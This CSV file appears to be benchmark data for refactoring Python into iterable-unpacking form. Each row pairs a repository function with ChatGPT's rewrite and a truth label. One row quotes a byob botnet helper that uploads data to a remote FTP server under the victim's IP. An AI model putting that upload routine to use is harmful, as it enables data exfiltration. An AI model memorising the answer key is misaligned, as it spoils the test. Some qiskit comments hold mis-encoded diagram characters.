repo_name,file_path,file_html,class_name,me_name,me_code,old_code,chatGPT_code,element_str,slice_str,truth_code,,
kornia,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/kornia/kornia/geometry/boxes.py,https://github.com/kornia/kornia/tree/master/kornia/geometry/boxes.py,Boxes3D,to_tensor$499,"def to_tensor(self, mode: str = ""xyzxyz"") -> torch.Tensor:
        r""""""Cast :class:`Boxes3D` to a tensor. ``mode`` controls which 3D boxes format should be use to represent boxes
        in the tensor.

        Args:
            mode: The format in which the boxes are provided.

                * 'xyzxyz': boxes are assumed to be in the format ``xmin, ymin, zmin, xmax, ymax, zmax`` where
                  ``width = xmax - xmin``, ``height = ymax - ymin`` and ``depth = zmax - zmin``.
                * 'xyzxyz_plus': similar to 'xyzxyz' mode but where box width, length and depth are defined as
                   ``width = xmax - xmin + 1``, ``height = ymax - ymin + 1`` and ``depth = zmax - zmin + 1``.
                * 'xyzwhd': boxes are assumed to be in the format ``xmin, ymin, zmin, width, height, depth`` where
                  ``width = xmax - xmin``, ``height = ymax - ymin`` and ``depth = zmax - zmin``.
                * 'vertices': boxes are defined by their vertices points in the following ``clockwise`` order:
                  *front-top-left, front-top-right, front-bottom-right, front-bottom-left, back-top-left,
                  back-top-right, back-bottom-right,  back-bottom-left*. Vertices coordinates are in (x,y, z) order.
                  Finally, box width, height and depth are defined as ``width = xmax - xmin``, ``height = ymax - ymin``
                  and ``depth = zmax - zmin``.
                * 'vertices_plus': similar to 'vertices' mode but where box width, length and depth are defined as
                  ``width = xmax - xmin + 1`` and ``height = ymax - ymin + 1``.

        Returns:
            3D Boxes tensor in the ``mode`` format. The shape depends with the ``mode`` value:

                * 'vertices' or 'verticies_plus': :math:`(N, 8, 3)` or :math:`(B, N, 8, 3)`.
                * Any other value: :math:`(N, 6)` or :math:`(B, N, 6)`.

        Note:
            It is currently non-differentiable due to a bug. See github issue
            `#1304 <https://github.com/kornia/kornia/issues/1396>`_.

        Examples:
            >>> boxes_xyzxyz = torch.as_tensor([[0, 3, 6, 1, 4, 8], [5, 1, 3, 8, 4, 9]])
            >>> boxes = Boxes3D.from_tensor(boxes_xyzxyz, mode='xyzxyz')
            >>> assert (boxes.to_tensor(mode='xyzxyz') == boxes_xyzxyz).all()
        """"""
        if self._boxes.requires_grad:
            raise RuntimeError(""Boxes3D.to_tensor doesn't support computing gradients since they aren't accurate. ""
                               ""Please, create boxes from tensors with `requires_grad=False`. ""
                               ""This is a known bug. Help is needed to fix it. For more information, ""
                               ""see https://github.com/kornia/kornia/issues/1396."")

        batched_boxes = self._boxes if self._is_batch else self._boxes.unsqueeze(0)

        # Create boxes in xyzxyz_plus format.
        boxes = torch.stack([batched_boxes.amin(dim=-2), batched_boxes.amax(dim=-2)], dim=-2).view(
            batched_boxes.shape[0], batched_boxes.shape[1], 6
        )

        mode = mode.lower()
        if mode in (""xyzxyz"", ""xyzxyz_plus""):
            pass
        elif mode in (""xyzwhd"", ""vertices"", ""vertices_plus""):
            width = boxes[..., 3] - boxes[..., 0] + 1
            height = boxes[..., 4] - boxes[..., 1] + 1
            depth = boxes[..., 5] - boxes[..., 2] + 1
            boxes[..., 3] = width
            boxes[..., 4] = height
            boxes[..., 5] = depth
        else:
            raise ValueError(f""Unknown mode {mode}"")

        if mode in (""xyzxyz"", ""vertices""):
            offset = torch.as_tensor([0, 0, 0, 1, 1, 1], device=boxes.device, dtype=boxes.dtype)
            boxes = boxes + offset

        if mode.startswith('vertices'):
            xmin, ymin, zmin = boxes[..., 0], boxes[..., 1], boxes[..., 2]
            width, height, depth = boxes[..., 3], boxes[..., 4], boxes[..., 5]

            boxes = _boxes3d_to_polygons3d(xmin, ymin, zmin, width, height, depth)

        boxes = boxes if self._is_batch else boxes.squeeze(0)
        return boxes","torch.stack([batched_boxes.amin(dim=-2), batched_boxes.amax(dim=-2)], dim=-2).view(batched_boxes.shape[0], batched_boxes.shape[1], 6)","torch.stack([batched_boxes.amin(dim=-2), batched_boxes.amax(dim=-2)], dim=-2).view(*batched_boxes.shape[:2], 6)","iterable_zj[0], iterable_zj[1]",*batched_boxes.shape[:2],*batched_boxes.shape[:2],1,
byob,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/byob/byob/core/util.py,https://github.com/malwaredllc/byob/tree/master/byob/core/util.py,,ftp$512,"def ftp(source, host=None, user=None, password=None, filetype=None):
    """"""
    Upload file/data to FTP server

    `Required`
    :param str source:    data or readable file-like object
    :param str host:      FTP server hostname
    :param str user:      FTP account username
    :param str password:  FTP account password

    `Optional`
    :param str filetype:  target file type (default: .txt)

    """"""
    import os
    import time
    import ftplib

    try:
        from StringIO import StringIO  # Python 2
    except ImportError:
        from io import StringIO        # Python 3

    if host and user and password:
        path  = ''
        local = time.ctime().split()
        if os.path.isfile(str(source)):
            path   = source
            source = open(path, 'rb')
        elif hasattr(source, 'seek'):
            source.seek(0)
        else:
            source = StringIO(source)
        try:
            ftp = ftplib.FTP(host=host, user=user, password=password)
        except:
            return ""Upload failed - remote FTP server authorization error""
        addr = public_ip()
        if 'tmp' not in ftp.nlst():
            ftp.mkd('/tmp')
        if addr not in ftp.nlst('/tmp'):
            ftp.mkd('/tmp/{}'.format(addr))
        if path:
            path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
        else:
            filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
            path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
        stor = ftp.storbinary('STOR ' + path, source)
        return path
    else:
        log('missing one or more required arguments: host, user, password')","'{}-{}_{}{}'.format(local[1], local[2], local[3], filetype)","'{}-{}_{}{}'.format(*local[1:4], filetype)","iterable_zj[1], iterable_zj[2], iterable_zj[3]",*local[1:4],*local[1:4],1,
nimfa,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nimfa/nimfa/methods/factorization/psmf.py,https://github.com/mims-harvard/nimfa/tree/master/nimfa/methods/factorization/psmf.py,Psmf,_update_sigma$344,"def _update_sigma(self):
        """"""Compute E-step and update sigma.""""""
        self.cross_terms = np.zeros((self.V.shape[0], self.rank, self.N))
        for cc in range(self.rank):
            t_c1 = np.tile(self.sigma[:, cc, :].reshape((self.sigma.shape[0], 1, self.sigma.shape[2])), (1, self.rank, 1))
            t_c2 = np.tile(np.dot(self.zeta[cc, :], self.zeta.T), (self.V.shape[0], 1))
            t_c3 = np.tile((self.lamb * np.tile(self.lamb[:, cc].reshape((self.lamb.shape[0], 1)), (1, self.rank)) * t_c2).reshape(
                t_c2.shape[0], t_c2.shape[1], 1), (1, 1, self.N))
            self.cross_terms += t_c1 * t_c3
        self.sigma = np.zeros(self.sigma.shape)
        for t in range(self.V.shape[1]):
            t_s1 = np.tile(self.__arr(self.V[:, t]), (1, self.rank)) - self.lamb * np.tile(
                self.zeta[:, t].T, (self.V.shape[0], 1))
            t_s2 = t_s1 ** 2 + self.lamb ** 2 * \
                np.tile(self.phi.T, (self.V.shape[0], 1))
            self.sigma -= 0.5 * \
                np.tile((t_s2 / np.tile(self.psi, (1, self.rank))).reshape(
                    t_s2.shape[0], t_s2.shape[1], 1), (1, 1, self.N))
        for n in range(self.N):
            for nn in range(self.N):
                if nn != n:
                    t_s1 = (1e-50 + self.rho[:, max(n, nn):self.N]).sum(
                        axis=1) / (1e-50 + self.rho[:, n:self.N]).sum(axis=1)
                    self.sigma[:, :, n] -= np.tile(t_s1.reshape(self.psi.shape) / self.psi, (1, self.rank)) * self.cross_terms[:,:, nn]        
        self.sigma = np.exp(self.sigma - np.tile(np.amax(self.sigma, 1).reshape(
            (self.sigma.shape[0], 1, self.sigma.shape[2])), (1, self.rank, 1)))
        self.sigma /= np.tile(self.sigma.sum(axis=1).reshape(
            (self.sigma.shape[0], 1, self.sigma.shape[2])), (1, self.rank, 1))
        self.cross_terms = self._cross_terms()
        self.s = np.argmax(self.sigma, axis=1)
        self.s = self.s.transpose([0, 1])","(self.lamb * np.tile(self.lamb[:, cc].reshape((self.lamb.shape[0], 1)), (1, self.rank)) * t_c2).reshape(t_c2.shape[0], t_c2.shape[1], 1)","(self.lamb * np.tile(self.lamb[:, cc].reshape((self.lamb.shape[0], 1)), (1, self.rank)) * t_c2).reshape(*t_c2.shape[:2], 1)","iterable_zj[0], iterable_zj[1]",*t_c2.shape[:2],*t_c2.shape[:2],1,
nimfa,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nimfa/nimfa/methods/factorization/psmf.py,https://github.com/mims-harvard/nimfa/tree/master/nimfa/methods/factorization/psmf.py,Psmf,_update_sigma$344,"def _update_sigma(self):
        """"""Compute E-step and update sigma.""""""
        self.cross_terms = np.zeros((self.V.shape[0], self.rank, self.N))
        for cc in range(self.rank):
            t_c1 = np.tile(self.sigma[:, cc, :].reshape((self.sigma.shape[0], 1, self.sigma.shape[2])), (1, self.rank, 1))
            t_c2 = np.tile(np.dot(self.zeta[cc, :], self.zeta.T), (self.V.shape[0], 1))
            t_c3 = np.tile((self.lamb * np.tile(self.lamb[:, cc].reshape((self.lamb.shape[0], 1)), (1, self.rank)) * t_c2).reshape(
                t_c2.shape[0], t_c2.shape[1], 1), (1, 1, self.N))
            self.cross_terms += t_c1 * t_c3
        self.sigma = np.zeros(self.sigma.shape)
        for t in range(self.V.shape[1]):
            t_s1 = np.tile(self.__arr(self.V[:, t]), (1, self.rank)) - self.lamb * np.tile(
                self.zeta[:, t].T, (self.V.shape[0], 1))
            t_s2 = t_s1 ** 2 + self.lamb ** 2 * \
                np.tile(self.phi.T, (self.V.shape[0], 1))
            self.sigma -= 0.5 * \
                np.tile((t_s2 / np.tile(self.psi, (1, self.rank))).reshape(
                    t_s2.shape[0], t_s2.shape[1], 1), (1, 1, self.N))
        for n in range(self.N):
            for nn in range(self.N):
                if nn != n:
                    t_s1 = (1e-50 + self.rho[:, max(n, nn):self.N]).sum(
                        axis=1) / (1e-50 + self.rho[:, n:self.N]).sum(axis=1)
                    self.sigma[:, :, n] -= np.tile(t_s1.reshape(self.psi.shape) / self.psi, (1, self.rank)) * self.cross_terms[:,:, nn]        
        self.sigma = np.exp(self.sigma - np.tile(np.amax(self.sigma, 1).reshape(
            (self.sigma.shape[0], 1, self.sigma.shape[2])), (1, self.rank, 1)))
        self.sigma /= np.tile(self.sigma.sum(axis=1).reshape(
            (self.sigma.shape[0], 1, self.sigma.shape[2])), (1, self.rank, 1))
        self.cross_terms = self._cross_terms()
        self.s = np.argmax(self.sigma, axis=1)
        self.s = self.s.transpose([0, 1])","(t_s2 / np.tile(self.psi, (1, self.rank))).reshape(t_s2.shape[0], t_s2.shape[1], 1)","(t_s2 / np.tile(self.psi, (1, self.rank))).reshape(*t_s2.shape[:2], 1)","iterable_zj[0], iterable_zj[1]",*t_s2.shape[:2],*t_s2.shape[:2],1,
gaphor,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/gaphor/gaphor/diagram/presentation.py,https://github.com/gaphor/gaphor/tree/master/gaphor/diagram/presentation.py,LinePresentation,draw$253,"def draw(self, context):
        def draw_line_end(end_handle, second_handle, draw):
            pos, p1 = end_handle.pos, second_handle.pos
            angle = atan2(p1.y - pos.y, p1.x - pos.x)
            cr.save()
            try:
                cr.translate(*pos)
                cr.rotate(angle)
                draw(context)
            finally:
                cr.restore()

        style = merge_styles(context.style, self.style)
        context = replace(context, style=style)

        self.update_shape_bounds(context)
        cr = context.cairo

        handles = self._handles
        draw_line_end(handles[0], handles[1], self.draw_head)

        for h in self._handles[1:-1]:
            cr.line_to(*h.pos)

        draw_line_end(handles[-1], handles[-2], self.draw_tail)

        stroke(context)

        for shape, rect in (
            (self.shape_head, self._shape_head_rect),
            (self.shape_middle, self._shape_middle_rect),
            (self.shape_tail, self._shape_tail_rect),
        ):
            if shape:
                shape.draw(context, rect)","draw_line_end(handles[0], handles[1], self.draw_head)","draw_line_end(*handles[:2], self.draw_head)","iterable_zj[0], iterable_zj[1]",*handles[:2],*handles[:2],1,
pyglet,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyglet/tools/wraptypes/cparser.py,https://github.com/pyglet/pyglet/tree/master/tools/wraptypes/cparser.py,,p_shift_expression$521,"def p_shift_expression(p):
    '''shift_expression : additive_expression
                        | shift_expression LEFT_OP additive_expression
                        | shift_expression RIGHT_OP additive_expression
    '''
    if len(p) == 2:
        p[0] = p[1]
    else:
        p[0] = BinaryExpressionNode({
            '<<': operator.lshift,
            '>>': operator.rshift}[p[2]], p[2], p[1], p[3])","BinaryExpressionNode({'<<': operator.lshift, '>>': operator.rshift}[p[2]], p[2], p[1], p[3])",Cannot refactor,"iterable_zj[0], iterable_zj[1], iterable_zj[2]",*p[:3],*p[1:5:2],0,
spotify-ripper,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/spotify-ripper/spotify_ripper/ripper.py,https://github.com/hbashton/spotify-ripper/tree/master/spotify_ripper/ripper.py,Ripper,run$178,"def run(self):
        args = self.args

        # start event loop
        self.event_loop.start()

        # wait for main thread to login
        self.ripper_continue.wait()
        if self.abort.is_set():
            return

        # list of spotify URIs
        uris = args.uri

        def get_tracks_from_uri(uri):
            self.current_playlist = None
            self.current_album = None
            self.current_chart = None

            if isinstance(uri, list):
                return uri
            else:
                if (uri.startswith(""spotify:artist:"") and
                        (args.artist_album_type is not None or
                         args.artist_album_market is not None)):
                    album_uris = self.web.get_albums_with_filter(uri)
                    return itertools.chain(
                        *[self.load_link(album_uri) for
                          album_uri in album_uris])
                elif uri.startswith(""spotify:charts:""):
                    charts = self.web.get_charts(uri)
                    if charts is not None:
                        self.current_chart = charts
                        chart_uris = charts[""tracks""]
                        return itertools.chain(
                            *[self.load_link(chart_uri) for
                              chart_uri in chart_uris])
                    else:
                        return iter([])
                else:
                    return self.load_link(uri)

        # calculate total size and time
        all_tracks = []
        for uri in uris:
            tracks = list(get_tracks_from_uri(uri))

            # TODO: remove dependency on current_album, ...
            for idx, track in enumerate(tracks):

                # ignore local tracks
                if track.is_local:
                    continue

                audio_file = self.format_track_path(idx, track)
                all_tracks.append((track, audio_file))

        self.progress.calc_total(all_tracks)

        if self.progress.total_size > 0:
            print(
                ""Total Download Size: "" +
                format_size(self.progress.total_size))

        # create track iterator
        for uri in uris:
            if self.abort.is_set():
                break

            tracks = list(get_tracks_from_uri(uri))

            if args.playlist_sync and self.current_playlist:
                self.sync = Sync(args, self)
                self.sync.sync_playlist(self.current_playlist)

            # ripping loop
            for idx, track in enumerate(tracks):
                try:
                    self.check_stop_time()
                    self.skip.clear()

                    if self.abort.is_set():
                        break

                    print('Loading track...')
                    track.load()
                    if track.availability != 1 or track.is_local:
                        print(
                            Fore.RED + 'Track is not available, '
                                       'skipping...' + Fore.RESET)
                        self.post.log_failure(track)
                        continue

                    self.audio_file = self.format_track_path(idx, track)

                    if not args.overwrite and path_exists(self.audio_file):
                        if is_partial(self.audio_file, track):
                            print(""Overwriting partial file"")
                        else:
                            print(
                                Fore.YELLOW + ""Skipping "" +
                                track.link.uri + Fore.RESET)
                            print(Fore.CYAN + self.audio_file + Fore.RESET)
                            self.post.queue_remove_from_playlist(idx)
                            continue

                    self.session.player.load(track)
                    self.prepare_rip(idx, track)
                    self.session.player.play()

                    timeout_count = 0
                    while not self.end_of_track.is_set() or \
                            not self.rip_queue.empty():
                        try:
                            if self.abort.is_set() or self.skip.is_set():
                                break

                            rip_item = self.rip_queue.get(timeout=1)

                            if self.abort.is_set() or self.skip.is_set():
                                break

                            self.rip(self.session, rip_item[0],
                                     rip_item[1], rip_item[2])
                        except queue.Empty:
                            timeout_count += 1
                            if timeout_count > 60:
                                raise spotify.Error(""Timeout while ""
                                                    ""ripping track"")

                    if self.skip.is_set():
                        extra_line = """" if self.play_token_resume.is_set() \
                                        else ""\n""
                        print(extra_line + Fore.YELLOW +
                            ""User skipped track... "" + Fore.RESET)
                        self.session.player.play(False)
                        self.post.clean_up_partial()
                        self.post.log_failure(track)
                        self.end_of_track.clear()
                        self.progress.end_track(show_end=False)
                        self.ripping.clear()
                        continue

                    if self.abort.is_set():
                        self.session.player.play(False)
                        self.end_of_track.set()
                        self.post.clean_up_partial()
                        self.post.log_failure(track)
                        break

                    self.end_of_track.clear()

                    self.finish_rip(track)

                    # update id3v2 with metadata and embed front cover image
                    set_metadata_tags(args, self.audio_file, idx, track, self)

                    # make a note of the index and remove all the
                    # tracks from the playlist when everything is done
                    self.post.queue_remove_from_playlist(idx)

                except (spotify.Error, Exception) as e:
                    if isinstance(e, Exception):
                        print(Fore.RED + ""Spotify error detected"" + Fore.RESET)
                    print(str(e))
                    print(""Skipping to next track..."")
                    self.session.player.play(False)
                    self.post.clean_up_partial()
                    self.post.log_failure(track)
                    continue

            # create playlist m3u file if needed
            self.post.create_playlist_m3u(tracks)

            # create playlist wpl file if needed
            self.post.create_playlist_wpl(tracks)

            # actually removing the tracks from playlist
            self.post.remove_tracks_from_playlist()

            # remove libspotify's offline storage cache
            self.post.remove_offline_cache()

        # logout, we are done
        self.post.end_failure_log()
        self.post.print_summary()
        self.logout()
        self.stop_event_loop()
        self.finished.set()","self.rip(self.session, rip_item[0], rip_item[1], rip_item[2])","self.rip(self.session, *rip_item[:3])","iterable_zj[0], iterable_zj[1], iterable_zj[2]",*rip_item[:3],*rip_item[:3],1,
PhiFlow,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PhiFlow/phi/torch/_torch_backend.py,https://github.com/tum-pbs/PhiFlow/tree/master/phi/torch/_torch_backend.py,TorchBackend,sparse_tensor$585,"def sparse_tensor(self, indices, values, shape):
        indices_ = self.to_int64(indices)
        values_ = self.to_float(values)
        if not self.is_available(values_):
            # the output of torch.sparse_coo_tensor is considered constant
            @torch.jit.script
            def sparse_coo_tensor(values, indices, cols: int, rows: int, dtype: torch.dtype) -> torch.sparse.Tensor:
                size = torch.Size([cols, rows])
                return torch.sparse_coo_tensor(indices, values, size=size, dtype=dtype)
            result = sparse_coo_tensor(values_, indices_, shape[0], shape[1], to_torch_dtype(self.float_type))
        else:
            result = torch.sparse_coo_tensor(indices_, values_, shape, dtype=to_torch_dtype(self.float_type))
        return result","sparse_coo_tensor(values_, indices_, shape[0], shape[1], to_torch_dtype(self.float_type))","sparse_coo_tensor(values_, indices_, *shape[:2], to_torch_dtype(self.float_type))","iterable_zj[0], iterable_zj[1]",*shape[:2],*shape[:2],1,
TerminalView,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/TerminalView/sublime_terminal_buffer.py,https://github.com/Wramberg/TerminalView/tree/master//sublime_terminal_buffer.py,TerminalViewUpdate,_update_cursor$339,"def _update_cursor(self):
        cursor_pos = self._sub_buffer.terminal_emulator().cursor()
        last_cursor_pos = self.view.settings().get(""terminal_view_last_cursor_pos"")
        if last_cursor_pos and last_cursor_pos[0] == cursor_pos[0] and last_cursor_pos[1] == cursor_pos[1]:
            return

        tp = self.view.text_point(cursor_pos[0], cursor_pos[1])
        self.view.sel().clear()
        self.view.sel().add(sublime.Region(tp, tp))
        self.view.settings().set(""terminal_view_last_cursor_pos"", cursor_pos)","self.view.text_point(cursor_pos[0], cursor_pos[1])",self.view.text_point(*cursor_pos[:2]),"iterable_zj[0], iterable_zj[1]",*cursor_pos[:2],*cursor_pos[:2],1,
qiskit-terra,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/qiskit-terra/test/python/transpiler/test_bip_mapping.py,https://github.com/Qiskit/qiskit-terra/tree/master/test/python/transpiler/test_bip_mapping.py,TestBIPMapping,test_multi_cregs$180,"def test_multi_cregs(self):
        """"""Test for multiple ClassicalRegisters.""""""

        #                      鈹屸攢鈹鈹鈹 鈻 鈹屸攢鈹
        # qr_0: 鈹鈹鈻犫攢鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹 X 鈹溾攢鈻戔攢鈹M鈹溾攢鈹鈹鈹鈹鈹鈹鈹鈹
        #       鈹屸攢鈹粹攢鈹     鈹屸攢鈹鈹鈹愨敂鈹鈹鈹鈹 鈻 鈹斺暐鈹樷攲鈹鈹
        # qr_1: 鈹 X 鈹溾攢鈹鈻犫攢鈹鈹 H 鈹溾攢鈹鈻犫攢鈹鈹鈻戔攢鈹鈺鈹鈹M鈹溾攢鈹鈹鈹鈹鈹
        #       鈹斺攢鈹鈹鈹樷攲鈹鈹粹攢鈹愨敂鈹鈹鈹鈹      鈻  鈺 鈹斺暐鈹樷攲鈹鈹
        # qr_2: 鈹鈹鈻犫攢鈹鈹 X 鈹溾攢鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈻戔攢鈹鈺鈹鈹鈺鈹鈹M鈹溾攢鈹鈹
        #       鈹屸攢鈹粹攢鈹愨敂鈹鈹鈹鈹           鈻  鈺  鈺 鈹斺暐鈹樷攲鈹鈹
        # qr_3: 鈹 X 鈹溾攢鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈻戔攢鈹鈺鈹鈹鈺鈹鈹鈺鈹鈹M鈹
        #       鈹斺攢鈹鈹鈹                鈻  鈺  鈺  鈺 鈹斺暐鈹
        #  c: 2/鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺┾晲鈺愨暚鈺愨晲鈺┾晲鈺愨暚鈺
        #                               0  鈺  1  鈺
        #                                  鈺     鈺
        #  d: 2/鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨暕鈺愨晲鈺愨晲鈺愨暕鈺
        #                                  0     1
        qr = QuantumRegister(4, ""qr"")
        cr1 = ClassicalRegister(2, ""c"")
        cr2 = ClassicalRegister(2, ""d"")
        circuit = QuantumCircuit(qr, cr1, cr2)
        circuit.cx(qr[0], qr[1])
        circuit.cx(qr[2], qr[3])
        circuit.cx(qr[1], qr[2])
        circuit.h(qr[1])
        circuit.cx(qr[1], qr[0])
        circuit.barrier(qr)
        circuit.measure(qr[0], cr1[0])
        circuit.measure(qr[1], cr2[0])
        circuit.measure(qr[2], cr1[1])
        circuit.measure(qr[3], cr2[1])

        coupling = CouplingMap([[0, 1], [0, 2], [2, 3]])  # linear [1, 0, 2, 3]
        property_set = {}
        actual = BIPMapping(coupling, objective=""depth"")(circuit, property_set)
        self.assertEqual(5, actual.depth())

        CheckMap(coupling)(actual, property_set)
        self.assertTrue(property_set[""is_swap_mapped""])","circuit.cx(qr[0], qr[1])",circuit.cx(*qr[:2]),"iterable_zj[0], iterable_zj[1]",*qr[:2],*qr[:2],1,
qiskit-terra,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/qiskit-terra/test/python/transpiler/test_bip_mapping.py,https://github.com/Qiskit/qiskit-terra/tree/master/test/python/transpiler/test_bip_mapping.py,TestBIPMapping,test_multi_cregs$180,"def test_multi_cregs(self):
        """"""Test for multiple ClassicalRegisters.""""""

        #                      鈹屸攢鈹鈹鈹 鈻 鈹屸攢鈹
        # qr_0: 鈹鈹鈻犫攢鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹 X 鈹溾攢鈻戔攢鈹M鈹溾攢鈹鈹鈹鈹鈹鈹鈹鈹
        #       鈹屸攢鈹粹攢鈹     鈹屸攢鈹鈹鈹愨敂鈹鈹鈹鈹 鈻 鈹斺暐鈹樷攲鈹鈹
        # qr_1: 鈹 X 鈹溾攢鈹鈻犫攢鈹鈹 H 鈹溾攢鈹鈻犫攢鈹鈹鈻戔攢鈹鈺鈹鈹M鈹溾攢鈹鈹鈹鈹鈹
        #       鈹斺攢鈹鈹鈹樷攲鈹鈹粹攢鈹愨敂鈹鈹鈹鈹      鈻  鈺 鈹斺暐鈹樷攲鈹鈹
        # qr_2: 鈹鈹鈻犫攢鈹鈹 X 鈹溾攢鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈻戔攢鈹鈺鈹鈹鈺鈹鈹M鈹溾攢鈹鈹
        #       鈹屸攢鈹粹攢鈹愨敂鈹鈹鈹鈹           鈻  鈺  鈺 鈹斺暐鈹樷攲鈹鈹
        # qr_3: 鈹 X 鈹溾攢鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈹鈻戔攢鈹鈺鈹鈹鈺鈹鈹鈺鈹鈹M鈹
        #       鈹斺攢鈹鈹鈹                鈻  鈺  鈺  鈺 鈹斺暐鈹
        #  c: 2/鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺┾晲鈺愨暚鈺愨晲鈺┾晲鈺愨暚鈺
        #                               0  鈺  1  鈺
        #                                  鈺     鈺
        #  d: 2/鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨暕鈺愨晲鈺愨晲鈺愨暕鈺
        #                                  0     1
        qr = QuantumRegister(4, ""qr"")
        cr1 = ClassicalRegister(2, ""c"")
        cr2 = ClassicalRegister(2, ""d"")
        circuit = QuantumCircuit(qr, cr1, cr2)
        circuit.cx(qr[0], qr[1])
        circuit.cx(qr[2], qr[3])
        circuit.cx(qr[1], qr[2])
        circuit.h(qr[1])
        circuit.cx(qr[1], qr[0])
        circuit.barrier(qr)
        circuit.measure(qr[0], cr1[0])
        circuit.measure(qr[1], cr2[0])
        circuit.measure(qr[2], cr1[1])
        circuit.measure(qr[3], cr2[1])

        coupling = CouplingMap([[0, 1], [0, 2], [2, 3]])  # linear [1, 0, 2, 3]
        property_set = {}
        actual = BIPMapping(coupling, objective=""depth"")(circuit, property_set)
        self.assertEqual(5, actual.depth())

        CheckMap(coupling)(actual, property_set)
        self.assertTrue(property_set[""is_swap_mapped""])","circuit.cx(qr[1], qr[2])",circuit.cx(*qr[1:3]),"iterable_zj[1], iterable_zj[2]",*qr[1:3],*qr[1:3],1,
